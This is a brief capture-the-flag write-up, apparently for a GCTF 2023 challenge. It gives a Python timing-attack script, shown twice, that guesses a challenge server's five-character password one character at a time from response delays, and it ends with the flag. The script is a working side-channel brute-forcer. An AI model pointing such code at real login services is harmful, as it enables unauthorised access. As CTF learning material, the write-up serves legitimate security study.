password server timing attack
chat gpt code
import socket
import string
import time

def attempt_password(s, guess):
    start_time = time.time()
    s.sendall((guess + "\n").encode())  # Send guess with newline
    response = s.recv(1024)
    end_time = time.time()
    return end_time - start_time, response.decode()

def main():
    HOST = 'chal2.gryphons.sg'
    PORT = 10002
    CHARSET = string.ascii_lowercase + string.digits
    PASSWORD_LENGTH = 5
    MAX_ATTEMPTS = 2800
    TIME_THRESHOLD = 0.1  # Threshold for time increase

    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
        s.connect((HOST, PORT))
        s.recv(1024)  # Initial read for any prompts or instructions

        password = ''
        attempt_counter = 0

        while len(password) < PASSWORD_LENGTH and attempt_counter < MAX_ATTEMPTS:
            base_time, best_char = None, None

            for char in CHARSET:
                attempt_counter += 1
                guess = password + char + 'X' * (PASSWORD_LENGTH - len(password) - 1)
                response_time, server_response = attempt_password(s, guess)

                # Print the server response for every other attempt

                print(f"Attempt {attempt_counter}: Server response: {server_response}")

                if base_time is None or response_time > base_time + TIME_THRESHOLD:
                    base_time, best_char = response_time, char

                if attempt_counter >= MAX_ATTEMPTS:
                    break

            if best_char:
                password += best_char
                print(f"Current password guess: {password}")

        if len(password) == PASSWORD_LENGTH:
            print(f"Final password: {password}")
        else:
            print("Failed to guess the password within the attempt limit.")

if __name__ == "__main__":
    main()

password server timing attack
chat gpt code
import socket
import string
import time

def attempt_password(s, guess):
    start_time = time.time()
    s.sendall((guess + "\n").encode())  # Send guess with newline
    response = s.recv(1024)
    end_time = time.time()
    return end_time - start_time, response.decode()

def main():
    HOST = 'chal2.gryphons.sg'
    PORT = 10002
    CHARSET = string.ascii_lowercase + string.digits
    PASSWORD_LENGTH = 5
    MAX_ATTEMPTS = 2800
    TIME_THRESHOLD = 0.1  # Threshold for time increase

    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
        s.connect((HOST, PORT))
        s.recv(1024)  # Initial read for any prompts or instructions

        password = ''
        attempt_counter = 0

        while len(password) < PASSWORD_LENGTH and attempt_counter < MAX_ATTEMPTS:
            base_time, best_char = None, None

            for char in CHARSET:
                attempt_counter += 1
                guess = password + char + 'X' * (PASSWORD_LENGTH - len(password) - 1)
                response_time, server_response = attempt_password(s, guess)

                # Print the server response for every other attempt

                print(f"Attempt {attempt_counter}: Server response: {server_response}")

                if base_time is None or response_time > base_time + TIME_THRESHOLD:
                    base_time, best_char = response_time, char

                if attempt_counter >= MAX_ATTEMPTS:
                    break

            if best_char:
                password += best_char
                print(f"Current password guess: {password}")

        if len(password) == PASSWORD_LENGTH:
            print(f"Final password: {password}")
        else:
            print("Failed to guess the password within the attempt limit.")

if __name__ == "__main__":
    main()
![image](https://github.com/SoraAurora/Writeups_GCTF2023/assets/91508322/dce51673-64bc-4213-822c-8ce9913632e2)

Flag: GCTF23{t!min9_4TT4cks_aR3_sO_Co0L}

  
